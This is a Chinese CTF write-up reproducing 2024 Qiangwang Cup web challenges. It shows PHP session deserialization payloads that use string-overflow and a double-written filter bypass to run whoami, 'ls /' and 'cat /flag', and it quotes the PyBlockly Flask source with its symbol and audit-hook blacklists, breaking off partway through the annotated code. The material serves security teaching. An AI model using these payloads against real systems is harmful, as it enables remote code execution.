<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:6:&quot;&quot;;</span><br></pre></td></tr></table></figure></div>

<p>在正式进行字符串溢出漏洞利用之前，先做一步确认 <code>dashboard.php</code> 会触发反序列化</p>
<p>准备要序列化的内容，当反序列化时，就会触发 <code>class.php</code> 的 <code>notouchitsclass.__destruct()</code> 的魔术方法  </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class notouchitsclass &#123;</span><br><span class="line">    public $data = &quot;system(&#x27;echo OK &gt; /tmp/OK&#x27;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new notouchitsclass();</span><br><span class="line">echo serialize($a);</span><br><span class="line">//O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:28:&quot;system(&#x27;echo OK &gt; /tmp/OK&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>直接本地将 session 内容修改</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">user|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:28:&quot;system(&#x27;echo OK &gt; /tmp/OK&#x27;);&quot;;&#125;......</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106100552865.png" class title="image-20241106100552865">

<p>访问 <code>dashboard.php</code> ，提示权限不够</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106100719371.png" class title="image-20241106100719371">

<p>本地 <code>docker</code> 的默认用户是 <code>root</code> ，修改之后，它默认权限也变为了 <code>root</code> ，将 <code>session</code> 文件权限降级</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown www-data:www-data /tmp/sess_abc</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106102907096.png" class title="image-20241106102907096">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106105740938.png" class title="image-20241106105740938">

<p>访问 <code>/dashboard.php</code> ，本地生成了 <code>/tmp/OK</code> ，说明反序列化确实执行了<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106105824027.png" class title="image-20241106105824027"></p>
<p>接下来就是 <strong>字符串溢出减少的利用</strong> </p>
<p>溢出减少的条件之一：两个相连可控参数，利用传参数组创造这个条件</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106110423045.png" class title="image-20241106110423045">

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106110457517.png" class title="image-20241106110457517">

<p>字符串溢出当有源码时可以本地调试时，构造技巧，可以直接让源码打印出替换后的值，然后改一次发一次，取出来再微调。</p>
<p>构造初步 Payload</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password[]=systemsystem&amp;password[]=&quot;;i:1;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:17:&quot;system(&#x27;whoami&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>发现当传入之后，这里的 <code>system</code> 被替换为空了</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106112720360.png" class title="image-20241106112720360">

<p>补上双写(双写的同时不能修改前面的数值，因为双写后有一个 <code>system</code> 会被替换为空)</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password[]=systemsystem&amp;password[]=&quot;;i:1;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:17:&quot;syssystemtem(&#x27;whoami&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>多次请求，将 <code>session</code> 写入，然后请求 <code>dashboard.php</code> ，本地测试成功</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106113631325.png" class title="image-20241106113631325">

<p>接下来打远程 !</p>
<p>发包时会返回 302 重定向，跳转到 <code>dashboard.php</code> ，不管它，多发几次，将内容写入 <code>session</code></p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106114358764.png" class title="image-20241106114358764">

<p>然后访问 <code>dashboard.php</code> ，成功执行 <code>whoami</code></p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106114350366.png" class title="image-20241106114350366">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password[]=systemsystem&amp;password[]=&quot;;i:1;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:15:&quot;syssystemtem(&#x27;ls /&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106114752216.png" class title="image-20241106114752216">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password[]=systemsystem&amp;password[]=&quot;;i:1;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:20:&quot;syssystemtem(&#x27;cat /flag&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106114906494.png" class title="image-20241106114906494">





<h2 id="2024-强网杯-PyBlockly"><a href="#2024-强网杯-PyBlockly" class="headerlink" title="[2024 强网杯]PyBlockly"></a>[2024 强网杯]PyBlockly</h2><p><strong>考点：len 函数重定义与命令注入、字符编码绕过、SUID 提权</strong> </p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107161833137.png" class title="image-20241107161833137">

<p>根目录服务为 JS Blockly 积木块，当拼接积木然后 <code>send</code> 发送时，会发送一个 JSON 数据，如发送 <code>1111</code> </p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107162007550.png" class title="image-20241107162007550">

<p>​                                                                                                返回了<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107162020328.png" class title="image-20241107162020328"></p>
<p><strong>源码如下：</strong></p>
<p>app.py  &#x2F;&#x2F; Flask Web服务核心源码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, jsonify</span><br><span class="line">import re</span><br><span class="line">import unidecode</span><br><span class="line">import string</span><br><span class="line">import ast</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">import importlib.util</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;JSON_AS_ASCII&#x27;] = False</span><br><span class="line"></span><br><span class="line">blacklist_pattern = r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span><br><span class="line"></span><br><span class="line">def module_exists(module_name):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    if spec is None:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    if module_name in sys.builtin_module_names:</span><br><span class="line">        return True</span><br><span class="line">    </span><br><span class="line">    if spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line">        </span><br><span class="line">        if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def verify_secure(m):</span><br><span class="line">    for node in ast.walk(m):</span><br><span class="line">        match type(node):</span><br><span class="line">            case ast.Import:  </span><br><span class="line">                print(&quot;ERROR: Banned module &quot;)</span><br><span class="line">                return False</span><br><span class="line">            case ast.ImportFrom: </span><br><span class="line">                print(f&quot;ERROR: Banned module &#123;node.module&#125;&quot;)</span><br><span class="line">                return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def check_for_blacklisted_symbols(input_text):</span><br><span class="line">    if re.search(blacklist_pattern, input_text):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def block_to_python(block):</span><br><span class="line">    block_type = block[&#x27;type&#x27;]</span><br><span class="line">    code = &#x27;&#x27;</span><br><span class="line">    </span><br><span class="line">    if block_type == &#x27;print&#x27;:</span><br><span class="line">        text_block = block[&#x27;inputs&#x27;][&#x27;TEXT&#x27;][&#x27;block&#x27;]</span><br><span class="line">        text = block_to_python(text_block)</span><br><span class="line">        code = f&quot;print(&#123;text&#125;)&quot;</span><br><span class="line">           </span><br><span class="line">    elif block_type == &#x27;math_number&#x27;:</span><br><span class="line">        </span><br><span class="line">        if str(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]).isdigit():      </span><br><span class="line">            code =  int(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]) </span><br><span class="line">        else:</span><br><span class="line">            code = &#x27;&#x27;</span><br><span class="line">    elif block_type == &#x27;text&#x27;:</span><br><span class="line">        if check_for_blacklisted_symbols(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]):</span><br><span class="line">            code = &#x27;&#x27;</span><br><span class="line">        else:</span><br><span class="line">        </span><br><span class="line">            code =  &quot;&#x27;&quot; + unidecode.unidecode(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]) + &quot;&#x27;&quot;</span><br><span class="line">    elif block_type == &#x27;max&#x27;:</span><br><span class="line">        </span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  f&quot;max(&#123;a&#125;, &#123;b&#125;)&quot;</span><br><span class="line"></span><br><span class="line">    elif block_type == &#x27;min&#x27;:</span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  f&quot;min(&#123;a&#125;, &#123;b&#125;)&quot;</span><br><span class="line"></span><br><span class="line">    if &#x27;next&#x27; in block:</span><br><span class="line">        </span><br><span class="line">        block = block[&#x27;next&#x27;][&#x27;block&#x27;]</span><br><span class="line">        </span><br><span class="line">        code +=&quot;\n&quot; + block_to_python(block)+ &quot;\n&quot;</span><br><span class="line">    else:</span><br><span class="line">        return code </span><br><span class="line">    return code</span><br><span class="line"></span><br><span class="line">def json_to_python(blockly_data):</span><br><span class="line">    block = blockly_data[&#x27;blocks&#x27;][&#x27;blocks&#x27;][0]</span><br><span class="line"></span><br><span class="line">    python_code = &quot;&quot;</span><br><span class="line">    python_code += block_to_python(block) + &quot;\n&quot; </span><br><span class="line">        </span><br><span class="line">    return python_code</span><br><span class="line"></span><br><span class="line">def do(source_code):</span><br><span class="line">    hook_code = &#x27;&#x27;&#x27;</span><br><span class="line">def my_audit_hook(event_name, arg):</span><br><span class="line">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="line">    if len(event_name) &gt; 4:</span><br><span class="line">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="line">    for bad in blacklist:</span><br><span class="line">        if bad in event_name:</span><br><span class="line">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="line"></span><br><span class="line">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    print(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = compile(source_code, &quot;run.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    try:</span><br><span class="line">        if verify_secure(tree):</span><br><span class="line">            with open(&quot;run.py&quot;, &#x27;w&#x27;) as f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([&#x27;python&#x27;, &#x27;run.py&#x27;], stdout=subprocess.PIPE, timeout=5).stdout.decode(&quot;utf-8&quot;)</span><br><span class="line">            os.remove(&#x27;run.py&#x27;)</span><br><span class="line">            return result</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Execution aborted due to security concerns.&quot;</span><br><span class="line">    except:</span><br><span class="line">        os.remove(&#x27;run.py&#x27;)</span><br><span class="line">        return &quot;Timeout!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return app.send_static_file(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/blockly_json&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def blockly_json():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    print(blockly_data)</span><br><span class="line">    print(type(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(&#x27;utf-8&#x27;))</span><br><span class="line">    print(blockly_data)</span><br><span class="line">    try:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        return do(python_code)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Error generating Python code&quot;, &quot;details&quot;: str(e)&#125;)</span><br><span class="line">    </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host = &#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>index.html  &#x2F;&#x2F;网站根目录 JS 服务，会给 <code>/blockly_json</code> 发送 POST 请求及数据</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;PyBlockly&lt;/title&gt;</span><br><span class="line">    &lt;script src=&quot;https://unpkg.com/blockly/blockly.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;PyBlockly&lt;/h1&gt;</span><br><span class="line">    &lt;div id=&quot;blocklyDiv&quot; style=&quot;height: 480px; width: 600px;&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;button id=&quot;saveButton&quot;&gt;Send&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;xml id=&quot;toolbox&quot; style=&quot;display: none&quot;&gt;</span><br><span class="line">      &lt;block type=&quot;text&quot;&gt;&lt;/block&gt;</span><br><span class="line">      &lt;block type=&quot;math_number&quot;&gt;&lt;/block&gt;</span><br><span class="line">      &lt;block type=&quot;math_arithmetic&quot;&gt;&lt;/block&gt;</span><br><span class="line">      &lt;block type=&quot;print&quot;&gt;&lt;/block&gt;</span><br><span class="line">      &lt;block type=&quot;max&quot;&gt;&lt;/block&gt;</span><br><span class="line">      &lt;block type=&quot;min&quot;&gt;&lt;/block&gt;</span><br><span class="line">    &lt;/xml&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      // Define custom &#x27;print&#x27; block</span><br><span class="line">      Blockly.defineBlocksWithJsonArray([&#123;</span><br><span class="line">        &quot;type&quot;: &quot;print&quot;,</span><br><span class="line">        &quot;message0&quot;: &quot;print %1&quot;,</span><br><span class="line">        &quot;args0&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;input_value&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;TEXT&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;previousStatement&quot;: null,</span><br><span class="line">        &quot;nextStatement&quot;: null,</span><br><span class="line">        &quot;colour&quot;: 160,</span><br><span class="line">        &quot;tooltip&quot;: &quot;Prints a value&quot;,</span><br><span class="line">        &quot;helpUrl&quot;: &quot;&quot;</span><br><span class="line">      &#125;]);</span><br><span class="line"></span><br><span class="line">      // Define custom &#x27;max&#x27; block</span><br><span class="line">      Blockly.defineBlocksWithJsonArray([&#123;</span><br><span class="line">        &quot;type&quot;: &quot;max&quot;,</span><br><span class="line">        &quot;message0&quot;: &quot;max of %1 and %2&quot;,</span><br><span class="line">        &quot;args0&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;input_value&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;A&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;input_value&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;B&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;output&quot;: &quot;Number&quot;,</span><br><span class="line">        &quot;colour&quot;: 230,</span><br><span class="line">        &quot;tooltip&quot;: &quot;Returns the maximum of two numbers&quot;,</span><br><span class="line">        &quot;helpUrl&quot;: &quot;&quot;</span><br><span class="line">      &#125;]);</span><br><span class="line"></span><br><span class="line">      // Define custom &#x27;min&#x27; block</span><br><span class="line">      Blockly.defineBlocksWithJsonArray([&#123;</span><br><span class="line">        &quot;type&quot;: &quot;min&quot;,</span><br><span class="line">        &quot;message0&quot;: &quot;min of %1 and %2&quot;,</span><br><span class="line">        &quot;args0&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;input_value&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;A&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;type&quot;: &quot;input_value&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;B&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;output&quot;: &quot;Number&quot;,</span><br><span class="line">        &quot;colour&quot;: 230,</span><br><span class="line">        &quot;tooltip&quot;: &quot;Returns the minimum of two numbers&quot;,</span><br><span class="line">        &quot;helpUrl&quot;: &quot;&quot;</span><br><span class="line">      &#125;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      // Initialize Blockly</span><br><span class="line">      var workspace = Blockly.inject(&#x27;blocklyDiv&#x27;, &#123;</span><br><span class="line">        toolbox: document.getElementById(&#x27;toolbox&#x27;),</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      // Handle the button click event</span><br><span class="line">      $(&#x27;#saveButton&#x27;).click(function() &#123;</span><br><span class="line">        // Convert the Blockly workspace to JSON</span><br><span class="line">        var json = Blockly.serialization.workspaces.save(workspace);</span><br><span class="line"></span><br><span class="line">        // Send the JSON to the Flask backend</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">          type: &#x27;POST&#x27;,</span><br><span class="line">          url: &#x27;/blockly_json&#x27;,</span><br><span class="line">          data: JSON.stringify(json),</span><br><span class="line">          contentType: &#x27;application/json&#x27;,</span><br><span class="line">          success: function(response) &#123;</span><br><span class="line">            alert(&#x27;JSON sent to backend and received response: &#x27; + response);</span><br><span class="line">          &#125;,</span><br><span class="line">          error: function(error) &#123;</span><br><span class="line">            alert(&#x27;Error sending JSON to backend.&#x27;);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>源码 + 自写注释，注释逻辑：从程序入口点开始看，跳转到其他自定义函数就往自定义函数写，最终写到程序执行结束</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, jsonify</span><br><span class="line">import re</span><br><span class="line">import unidecode</span><br><span class="line">import string</span><br><span class="line">import ast</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">import importlib.util</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;JSON_AS_ASCII&#x27;] = False</span><br><span class="line"></span><br><span class="line">blacklist_pattern = r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span><br><span class="line"></span><br><span class="line">def module_exists(module_name):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    if spec is None:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    if module_name in sys.builtin_module_names:</span><br><span class="line">        return True</span><br><span class="line">    </span><br><span class="line">    if spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line">        </span><br><span class="line">        if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def verify_secure(m):</span><br><span class="line">    for node in ast.walk(m):  # 遍历抽象语法树（AST）中的所有节点</span><br><span class="line">        match type(node):   # 返回每个节点的类型, 并用match 匹配</span><br><span class="line">            case ast.Import:  # 如果匹配到是 ast.Import 节点类型, 则返回 false</span><br><span class="line">                print(&quot;ERROR: Banned module &quot;) </span><br><span class="line">                return False</span><br><span class="line">            case ast.ImportFrom:  # 如果匹配到是 ast.ImportFrom 节点类型, 则返回 false</span><br><span class="line">                print(f&quot;ERROR: Banned module &#123;node.module&#125;&quot;)</span><br><span class="line">                return False</span><br><span class="line">    return True  # 如果都没匹配到, 则返回 true</span><br><span class="line"></span><br><span class="line">def check_for_blacklisted_symbols(input_text): # 搭配 block_to_python 自定义函数取处理 json 数据</span><br><span class="line">    if re.search(blacklist_pattern, input_text):  # 将字符与黑名单字符进行匹配，成功则返回true</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def block_to_python(block):  # 该自定义函数的功能总体为处理请求体取出的 json 数据</span><br><span class="line">    block_type = block[&#x27;type&#x27;]  # 取出 &#x27;type&#x27; 的值</span><br><span class="line">    code = &#x27;&#x27;</span><br><span class="line">    </span><br><span class="line">    if block_type == &#x27;print&#x27;:  </span><br><span class="line">        text_block = block[&#x27;inputs&#x27;][&#x27;TEXT&#x27;][&#x27;block&#x27;]  # 如果取出的 &#x27;type&#x27; 的值为 &#x27;print&#x27;, 则继续取内部的 [&#x27;inputs&#x27;][&#x27;TEXT&#x27;][&#x27;block&#x27;]的键值</span><br><span class="line">        text = block_to_python(text_block)  # 将取出的键值(还是 json 数据)继续给当前自定义函数, 直到得到最终的匹配值返回</span><br><span class="line">        code = f&quot;print(&#123;text&#125;)&quot;  # 然后将最后匹配好的字符取出给 code</span><br><span class="line">           </span><br><span class="line">    elif block_type == &#x27;math_number&#x27;: </span><br><span class="line">                                                # 如果block_type是 &#x27;math_number&#x27;, 继续</span><br><span class="line">        if str(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]).isdigit():  </span><br><span class="line">            code =  int(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]) # 如果[&#x27;fields&#x27;][&#x27;NUM&#x27;]取出的字符转为字符串后是纯字符串型，则转为int类型并赋值给code</span><br><span class="line">        else:</span><br><span class="line">            code = &#x27;&#x27;</span><br><span class="line">    elif block_type == &#x27;text&#x27;:  </span><br><span class="line">        if check_for_blacklisted_symbols(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]): #如果block_type是 &#x27;text&#x27;，则在调用check_for_blacklisted_symbols，继续跟进</span><br><span class="line">            code = &#x27;&#x27;  # 返回true, 则code为空</span><br><span class="line">        else:</span><br><span class="line">        </span><br><span class="line">            code =  &quot;&#x27;&quot; + unidecode.unidecode(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]) + &quot;&#x27;&quot;  # 返回flase，则将字符进行unidecode解码(用于处理特殊字符，这里存在特殊字符全角转换绕过)并拼接给code</span><br><span class="line">    elif block_type == &#x27;max&#x27;:</span><br><span class="line">        </span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)    #如果类型是max，则取出 [&#x27;inputs&#x27;][&#x27;A&#x27;/&#x27;B&#x27;][&#x27;block&#x27;]的值丢给当前自定义函数继续执行, 直到得到最终的匹配值返回</span><br><span class="line">        b = block_to_python(b_block)    </span><br><span class="line">        code =  f&quot;max(&#123;a&#125;, &#123;b&#125;)&quot;    # 然后将最后匹配好的字符取出给 code</span><br><span class="line"></span><br><span class="line">    elif block_type == &#x27;min&#x27;:</span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)   # #如果类型是max，则取出 [&#x27;inputs&#x27;][&#x27;A&#x27;/&#x27;B&#x27;][&#x27;block&#x27;]的值丢给当前自定义函数继续执行, 直到得到最终的匹配值返回</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  f&quot;min(&#123;a&#125;, &#123;b&#125;)&quot;   # 然后将最后匹配好的字符取出给 code</span><br><span class="line"></span><br><span class="line">    if &#x27;next&#x27; in block:</span><br><span class="line">        </span><br><span class="line">        block = block[&#x27;next&#x27;][&#x27;block&#x27;]</span><br><span class="line">        </span><br><span class="line">        code +=&quot;\n&quot; + block_to_python(block)+ &quot;\n&quot;</span><br><span class="line">    else:</span><br><span class="line">        return code </span><br><span class="line">    return code  # 最终将参数code返回</span><br><span class="line"></span><br><span class="line">def json_to_python(blockly_data):</span><br><span class="line">    block = blockly_data[&#x27;blocks&#x27;][&#x27;blocks&#x27;][0]  # 取出 json 数据的 [&#x27;blocks&#x27;][&#x27;blocks&#x27;][0], 就是走过两个 blocks 元素后取出内部的键值(一个内嵌的json数据)</span><br><span class="line"></span><br><span class="line">    python_code = &quot;&quot; </span><br><span class="line">    python_code += block_to_python(block) + &quot;\n&quot;  # 将取出的数据丢给自定义函数 block_to_python, 继续跟进到block_to_python内部</span><br><span class="line">        </span><br><span class="line">    return python_code</span><br><span class="line"></span><br><span class="line">def do(source_code):</span><br><span class="line">    hook_code = &#x27;&#x27;&#x27;  </span><br><span class="line">def my_audit_hook(event_name, arg):</span><br><span class="line">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="line">    if len(event_name) &gt; 4:</span><br><span class="line">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="line">    for bad in blacklist:</span><br><span class="line">        if bad in event_name:</span><br><span class="line">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="line"></span><br><span 